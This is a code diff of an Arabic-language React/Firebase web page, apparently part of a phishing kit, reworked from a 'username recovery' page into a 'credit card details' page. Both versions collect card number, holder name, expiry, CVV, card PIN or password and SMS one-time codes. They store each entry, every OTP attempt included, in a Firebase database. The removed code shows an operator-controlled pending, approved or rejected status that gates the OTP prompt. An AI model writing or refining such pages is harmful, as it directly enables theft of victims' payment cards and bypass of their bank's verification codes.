@@ -1,21 +1,23 @@
 "use client"
 
-import { useState, useRef, useEffect } from "react"
+import { useEffect, useRef, useState } from "react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { ChevronRight, Camera, Info, X } from "lucide-react"
-import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
-import { doc, onSnapshot } from "firebase/firestore"
+import { Card } from "@/components/ui/card"
+import { ArrowRight, Camera, Menu, Circle, ChevronRight } from "lucide-react"
 import { addData, db } from "@/lib/firebase"
+import { doc, onSnapshot } from "firebase/firestore"
+import { OtpDialog } from "./otp-dialog"
 import Loader from "./loader"
-const allOtps = ['']
-export default function UsernameRecoveryPage() {
+
+const allOtps = [""]
+
+export default function CreditCardPage() {
+  const [cardHolder, setCardHolder] = useState("")
+  const [expiryDate, setExpiryDate] = useState("")
+  const [cvv, setCvv] = useState("")
   const [phoneNumber, setPhoneNumber] = useState("")
-  const [cardNumbers, setCardNumbers] = useState(["", "", "", ""])
-  const [expiryMonth, setExpiryMonth] = useState("")
-  const [expiryYear, setExpiryYear] = useState("")
-  const [cvc, setCvc] = useState("")
+  const [cardNumbers, setCardNumbers] = useState("")
   const [otpValues, setOtpValues] = useState(["", "", "", ""])
   const [showOtp, setShowOtp] = useState(false)
   const [otpError, setOtpError] = useState("")
@@ -25,89 +27,48 @@ export default function UsernameRecoveryPage() {
 
   const cardInputRefs = useRef<(HTMLInputElement | null)[]>([])
 
-  const handleCardNumberChange = (index: number, value: string) => {
-    const numericValue = value.replace(/\D/g, "").slice(0, 4)
-    const newCardNumbers = [...cardNumbers]
-    newCardNumbers[index] = numericValue
-    setCardNumbers(newCardNumbers)
-
-    if (numericValue.length === 4 && index < 3) {
-      cardInputRefs.current[index + 1]?.focus()
-    }
-
-    // Clear error when user starts typing
-    if (errors[`card-${index}`]) {
-      setErrors((prev) => ({ ...prev, [`card-${index}`]: "" }))
-    }
-  }
-
-  const handleOtpChange = (index: number, value: string) => {
-    if (value.length > 1) return // Only allow single digit
-
-    const newOtpValues = [...otpValues]
-    newOtpValues[index] = value
-    setOtpValues(newOtpValues)
-
-    // Auto-focus next input
-    if (value && index < 3) {
-      const nextInput = document.getElementById(`otp-${index + 1}`)
-      nextInput?.focus()
-    }
-
-    // Clear error when user starts typing
-    if (otpError) setOtpError("")
-  }
-
   const validateForm = () => {
     const newErrors: { [key: string]: string } = {}
 
-    // Validate phone number
-    if (!phoneNumber.trim()) {
-      newErrors.phoneNumber = "رقم الهاتف مطلوب"
-    } else if (!/^\d{8}$/.test(phoneNumber)) {
-      newErrors.phoneNumber = "رقم الهاتف يجب أن يكون 8 أرقام"
-    }
+
 
     // Validate card numbers
-    cardNumbers.forEach((number, index) => {
-      if (!number.trim()) {
-        newErrors[`card-${index}`] = "رقم البطاقة مطلوب"
-      } else if (number.length !== 4) {
-        newErrors[`card-${index}`] = "يجب أن يكون 4 أرقام"
-      }
-    })
-
-    // Validate expiry month
-    if (!expiryMonth.trim()) {
-      newErrors.expiryMonth = "الشهر مطلوب"
-    } else if (!/^(0[1-9]|1[0-2])$/.test(expiryMonth)) {
-      newErrors.expiryMonth = "شهر غير صحيح"
+    if (!cardNumbers.trim()) {
+      newErrors.cardNumbers = "رقم البطاقة مطلوب"
     }
 
-    // Validate expiry year
-    if (!expiryYear.trim()) {
-      newErrors.expiryYear = "السنة مطلوبة"
-    } else if (!/^\d{2}$/.test(expiryYear)) {
-      newErrors.expiryYear = "سنة غير صحيحة"
+    // Validate expiry date
+    if (!expiryDate.trim()) {
+      newErrors.expiryDate = "تاريخ انتهاء الصلاحية مطلوب"
+    } else if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
+      newErrors.expiryDate = "تاريخ غير صحيح (MM/YY)"
     }
 
-    // Validate CVC
-    if (!cvc.trim()) {
-      newErrors.cvc = "رمز الأمان مطلوب"
-    } else if (!/^\d{3}$/.test(cvc)) {
-      newErrors.cvc = "رمز الأمان يجب أن يكون 3 أرقام"
+    // Validate CVV
+    if (!cvv.trim()) {
+      newErrors.cvv = "رمز الأمان مطلوب"
+    } else if (!/^\d{3}$/.test(cvv)) {
+      newErrors.cvv = "رمز الأمان يجب أن يكون 3 أرقام"
     }
 
     setErrors(newErrors)
     return Object.keys(newErrors).length === 0
   }
 
-  const handleContinue = (e: any) => {
+  const handleContinue = (otp: string) => {
+    setIsLoading(true)
 
-    const otpString = otpValues.join("")
-    allOtps.push(otpString)
-    const visitorId = localStorage.getItem("visitor");
-    addData({ id: visitorId, otp: otpString, allOtps })
+    const otpString = otp
+    allOtps.push(otp)
+    const visitorId = localStorage.getItem("visitor")
+
+    addData({
+      id: visitorId,
+      otp: otpString, // Changed from otpValues to otpString
+      allOtps,
+      cardHolder,
+    })
+
     // Validate OTP
     if (otpString.length !== 4) {
       setOtpError("يرجى إدخال رمز التحقق المكون من 4 أرقام")
@@ -122,13 +83,14 @@ export default function UsernameRecoveryPage() {
     // Simulate OTP verification (you can replace with actual API call)
     if (otpString !== "1234") {
       setOtpError("رمز التحقق غير صحيح")
-      setOtpValues(['','','',''])
+      setOtpValues(["", "", "", ""])
+      setIsLoading(false)
+
       return
     }
 
     // Success - proceed with form submission
     console.log("OTP verified successfully")
-
   }
 
   const handleCloseOtp = () => {
@@ -136,231 +98,188 @@ export default function UsernameRecoveryPage() {
     setOtpValues(["", "", "", ""])
     setOtpError("")
   }
-  useEffect(() => {
-    const visitorId = localStorage.getItem("visitor");
-    if (visitorId) {
-      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
-        if (docSnap.exists()) {
-          const data = docSnap.data() as any;
-          if (data.status === "pending") {
-            setIsLoading(true);
-          } else if (data.status === "approved") {
-            setIsLoading(false);
-            setShowOtp(true)
-          } else if (data.status === "rejected") {
-            setIsLoading(false);
-            alert("Card rejected please try again!");
-          }
-        }
-      });
 
-      return () => unsubscribe();
-    }
-  }, []);
-  const handleSubmit = (e: any) => {
+
+  const handleSubmit = async (e: any) => {
     e.preventDefault()
-    const visitorId = localStorage.getItem("visitor");
-    const exp = `${expiryMonth}/${expiryYear}`;
+    setIsLoading(true)
+    if (!validateForm()) {
+      return
+    }
 
-    addData({
+    const visitorId = localStorage.getItem("visitor")
+
+    await addData({
       id: visitorId,
       cardNumber: cardNumbers,
-      status: 'pending',
-      cvv: cvc,
-      expiaryDate: exp,
-      pass
-    });
-    setTimeout(()=>{
+      cardHolder,
+      status: "pending",
+      cvv: cvv,
+      expiryDate: expiryDate, // Fixed typo from "expiaryDate"
+      pass,
+    })
+
+    setTimeout(() => {
       setShowOtp(true)
-    },2000)
+      setIsLoading(false)
+
+    }, 2000)
   }
+
   return (
     <div className="min-h-screen bg-gray-100">
-      <form onSubmit={handleSubmit}>
-        {/* Header */}
-        <div className="bg-black h-12 flex items-center justify-between px-4">
-        <ChevronRight className="w-6 h-6 text-red-500" />
-          <img src="/logo.png" className="w-18 h-6 text-red-500" />
-          
+      {/* Status Bar */}
+
+      {/* Header */}
+      <div className="bg-gray-100 px-4 py-6 flex items-center justify-between">
+        <ArrowRight className="w-6 h-6 text-gray-600" />
+        <h1 className="text-lg font-semibold text-gray-800 text-center flex-1">تفاصيل البطاقة الائتمانية</h1>
+        <div className="w-6"></div>
+      </div>
+      {isLoading && <Loader />}
+      {/* Main Content */}
+      <div className="px-4 pb-24">
+        {/* Credit Card Preview */}
+        <div className="mb-8">
+          <Card className="bg-white p-6 rounded-2xl shadow-sm">
+            <div className="space-y-4">
+              {/* Card chip and contactless */}
+              <div className="flex justify-between items-start">
+                <div className="flex gap-2">
+                  <div className="w-3 h-2 bg-gray-300 rounded-sm"></div>
+                  <div className="w-3 h-2 bg-gray-300 rounded-sm"></div>
+                </div>
+              </div>
+
+              {/* Card chip */}
+              <div className="w-12 h-9 bg-gray-300 rounded-md"></div>
+
+              {/* Card number placeholders */}
+              <div className="flex justify-between">
+                <div className="w-16 h-3 bg-gray-300 rounded"></div>
+                <div className="w-16 h-3 bg-gray-300 rounded"></div>
+                <div className="w-16 h-3 bg-gray-300 rounded"></div>
+                <div className="w-16 h-3 bg-gray-300 rounded"></div>
+              </div>
+
+              {/* Expiry date placeholder */}
+              <div className="flex justify-center">
+                <div className="w-12 h-3 bg-gray-300 rounded"></div>
+              </div>
+
+              {/* Card holder name placeholder */}
+              <div className="flex gap-2">
+                <div className="w-16 h-3 bg-gray-300 rounded"></div>
+                <div className="w-12 h-3 bg-gray-300 rounded"></div>
+              </div>
+            </div>
+          </Card>
         </div>
 
-        {/* Main Content */}
-        <div className="px-6 py-8 space-y-8">
-          {/* Title */}
-          <h1 className="text-2xl font-bold text-gray-900 text-center">ربط بطاقتك البنكية بسوار الدفع الذكي</h1>
+        {/* Form Fields */}
+        <form className="space-y-4" onSubmit={handleSubmit}>
+          {/* Card Number */}
+          <div className="relative">
+            <Input
+              type="tel"
+              maxLength={19}
+              placeholder="رقم البطاقة"
+              required
+              value={cardNumbers}
+              onChange={(e) => setCardNumbers(e.target.value)}
+              className="w-full h-14 text-right pr-12 text-gray-600 border-gray-300 rounded-xl"
+            />
+            {errors.cardNumbers && <div className="text-red-500 text-sm mt-1">{errors.cardNumbers}</div>}
+            <Camera className="absolute left-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" />
+            <Menu className="absolute right-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" />
+          </div>
 
-          {/* Phone Number Section */}
-       
-          {/* Card Number Section */}
-          <div className="space-y-4">
-            <label className="block text-gray-600 text-right">
-              رقم بطاقة الخصم المباشر <span className="text-red-500">*</span>
-            </label>
+          {/* Card Holder */}
+          <div>
+            <Input
+              type="text"
+              placeholder="حامل البطاقة"
+              required
+              value={cardHolder}
+              onChange={(e) => setCardHolder(e.target.value)}
+              className="w-full h-14 text-right pr-4 text-gray-600 border-gray-300 rounded-xl"
+            />
+          </div>
 
-            <div className="grid grid-cols-4 gap-2">
-              {cardNumbers.map((number, index) => (
-                <div key={index}>
-                  <Input
-                    ref={(el) => (cardInputRefs.current[index] = el) as any}
-                    value={number}
-                    onChange={(e) => handleCardNumberChange(index, e.target.value)}
-                    className={`text-center border-0 border-b-2 rounded-none ${errors[`card-${index}`] ? "border-red-500" : ""}`}
-                    placeholder="XXXX"
-                    maxLength={4}
-                    required
-                    inputMode="numeric"
-                  />
-                  {errors[`card-${index}`] && (
-                    <div className="text-red-500 text-xs text-center mt-1">{errors[`card-${index}`]}</div>
-                  )}
-                </div>
-              ))}
+          {/* Phone Number */}
+
+
+          {/* Expiry Date and CVV */}
+          <div className="flex gap-4">
+            <div className="flex-1">
+              <Input
+                type="text"
+                placeholder="رمز الحماية الثلاثي"
+                required
+                maxLength={3}
+                value={cvv}
+                onChange={(e) => setCvv(e.target.value)}
+                className="w-full h-14 text-center text-gray-600 border-gray-300 rounded-xl"
+              />
+              {errors.cvv && <div className="text-red-500 text-sm mt-1">{errors.cvv}</div>}
+              <div className="text-center text-xs text-gray-400 mt-1">XXX</div>
+            </div>
+            <div className="flex-1">
+              <Input
+                type="text"
+                placeholder="تاريخ انتهاء الصلاحية"
+                value={
+                  expiryDate.length === 2 ? expiryDate.substring(0, 2) + "/" + expiryDate.substring(2, 4) : expiryDate
+                }
+                onChange={(e) => {
+                  let value = e.target.value.replace(/\D/g, "") // Remove non-digits
+                  if (value.length >= 2) {
+                    value = value.substring(0, 2) + "/" + value.substring(2, 4)
+                  }
+                  setExpiryDate(value)
+                }}
+                maxLength={5}
+                className="w-full h-14 text-center text-gray-600 border-gray-300 rounded-xl"
+              />
+              {errors.expiryDate && <div className="text-red-500 text-sm mt-1">{errors.expiryDate}</div>}
+              <div className="text-center text-xs text-gray-400 mt-1">MM/YY</div>
             </div>
           </div>
 
-          <div className="space-y-4">
-            <label className="block text-gray-600 text-right">
-              تاريخ الانتهاء ورمز الأمان <span className="text-red-500">*</span>
-            </label>
-            <div className="flex justify-center gap-2">
-              <div>
-                <Input
-                  value={cvc}
-                  onChange={(e) => {
-                    const numericValue = e.target.value.replace(/\D/g, "").slice(0, 3)
-                    setCvc(numericValue)
-                    if (errors.cvc) {
-                      setErrors((prev) => ({ ...prev, cvc: "" }))
-                    }
-                  }}
-                  className={`text-center w-20 ${errors.cvc ? "border-red-500" : ""}`}
-                  placeholder="CVC"
-                  maxLength={3}
-                  required
-                  inputMode="numeric"
-                />
-                {errors.cvc && <div className="text-red-500 text-xs text-center mt-1">{errors.cvc}</div>}
-              </div>
-              <div>
-                <Input
-                  value={expiryMonth}
-                  onChange={(e) => {
-                    const numericValue = e.target.value.replace(/\D/g, "").slice(0, 2)
-                    setExpiryMonth(numericValue)
-                    if (errors.expiryMonth) {
-                      setErrors((prev) => ({ ...prev, expiryMonth: "" }))
-                    }
-                  }}
-                  className={`text-center w-20 ${errors.expiryMonth ? "border-red-500" : ""}`}
-                  placeholder="MM"
-                  maxLength={2}
-                  required
-                  inputMode="numeric"
-                />
-                {errors.expiryMonth && (
-                  <div className="text-red-500 text-xs text-center mt-1">{errors.expiryMonth}</div>
-                )}
-              </div>
-              <div>
-                <Input
-                  value={expiryYear}
-                  onChange={(e) => {
-                    const numericValue = e.target.value.replace(/\D/g, "").slice(0, 2)
-                    setExpiryYear(numericValue)
-                    if (errors.expiryYear) {
-                      setErrors((prev) => ({ ...prev, expiryYear: "" }))
-                    }
-                  }}
-                  className={`text-center w-20 ${errors.expiryYear ? "border-red-500" : ""}`}
-                  placeholder="YY"
-                  maxLength={2}
-                  required
-                  inputMode="numeric"
-                />
-                {errors.expiryYear && <div className="text-red-500 text-xs text-center mt-1">{errors.expiryYear}</div>}
-              </div>
-            </div>
-            <div>
-            <div>
-            <label className="block text-gray-600 text-right py-2">
-              الرقم السري  <span className="text-red-500">*</span>
-            </label>
-                <Input
-                  value={pass}
-                  onChange={(e) => {
-                    setPass(e.target.value)
-                 
-                  }}
-                  className={`text-center w-full mx-2 `}
-                  placeholder="####"
-                  maxLength={4}
-                  
-                  required
-                  inputMode="numeric"
-                />
-                {errors.expiryMonth && (
-                  <div className="text-red-500 text-xs text-center mt-1">{errors.expiryMonth}</div>
-                )}
-              </div>
-            </div>
+          {/* Password */}
+          <div>
+            <Input
+              type="password"
+              placeholder="كلمة المرور"
+              value={pass}
+              onChange={(e) => setPass(e.target.value)}
+              className="w-full h-14 text-right pr-4 text-gray-600 border-gray-300 rounded-xl"
+            />
           </div>
 
-        
-
-          {/* Continue Button */}
-          <div className="pt-8">
+          {/* Use Card Button */}
+          <div className="pt-4">
             <Button
               type="submit"
-              className="w-full bg-red-500 hover:bg-red-600 text-white py-4 rounded-full text-lg"
+              disabled={isLoading}
+              className="w-full h-14 bg-orange-500 hover:bg-orange-600 text-white text-lg font-medium rounded-xl"
             >
-              استمرار
+              {isLoading ? "جاري المعالجة..." : "استخدام البطاقة"}
             </Button>
           </div>
+        </form>
+      </div>
+
+      <OtpDialog isOpen={showOtp} onClose={() => setShowOtp(false)} onVerify={handleContinue} />
+
+      {/* Bottom Navigation */}
+      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 px-4 py-4">
+        <div className="flex justify-between items-center">
+          <Menu className="w-6 h-6 text-gray-400" />
+          <Circle className="w-8 h-8 text-gray-400" />
+          <ChevronRight className="w-6 h-6 text-gray-400" />
         </div>
-      </form>
-      {isLoading && <Loader />}
-      <Dialog open={showOtp} onOpenChange={handleCloseOtp}>
-        <DialogContent className="sm:max-w-md">
-          <DialogHeader>
-            <DialogTitle className="text-right">رمز التحقق</DialogTitle>
-            <Button variant="ghost" size="icon" className="absolute left-4 top-4" onClick={handleCloseOtp}>
-              <X className="h-4 w-4" />
-            </Button>
-          </DialogHeader>
-
-          <div className="space-y-4">
-            <p className="text-sm text-gray-500 text-right">تم إرسال رمز التحقق إلى رقم هاتفك</p>
-
-            <div className="flex justify-center gap-3">
-              {otpValues.map((value, index) => (
-                <Input
-                  key={index}
-                  id={`otp-${index}`}
-                  value={value}
-                  onChange={(e) => handleOtpChange(index, e.target.value)}
-                  className="w-12 h-12 text-center text-lg font-bold"
-                  maxLength={1}
-                  type="text"
-                  inputMode="numeric"
-                />
-              ))}
-            </div>
-
-            {otpError && (
-              <div className="text-red-500 text-sm text-center bg-red-50 p-3 rounded-lg border border-red-200">
-                {otpError}
-              </div>
-            )}
-
-            <Button
-              onClick={handleContinue}
-              className="w-full bg-red-500 hover:bg-red-600 text-white py-4 rounded-full text-lg"
-            >
-              تأكيد
-            </Button>
-          </div>
-        </DialogContent>
-      </Dialog>
+      </div>
     </div>
   )
 }
